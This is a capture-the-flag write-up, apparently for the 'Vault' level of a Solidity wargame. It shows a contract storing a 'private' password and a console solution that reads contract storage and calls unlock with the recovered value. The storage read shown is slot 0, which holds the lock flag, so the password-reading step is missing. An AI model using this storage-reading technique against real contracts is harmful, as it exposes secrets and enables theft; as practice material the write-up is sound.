# Vault level  image
Goal:
- Unlock the vault to pass the level!
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
    bool public locked;
    bytes32 private password;

    constructor(bytes32 _password) {
        locked = true;
        password = _password;
    }

    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }
}
```
solution:
```javascript
await web3.eth.getStorageAt(instance,0);
'0x0000000000000000000000000000000000000000000000000000000000000001'
```
await contract.unlock('0x412076657279207374726f6e67207365637265742070617373776f7264203a29')
await contract.locked()
false
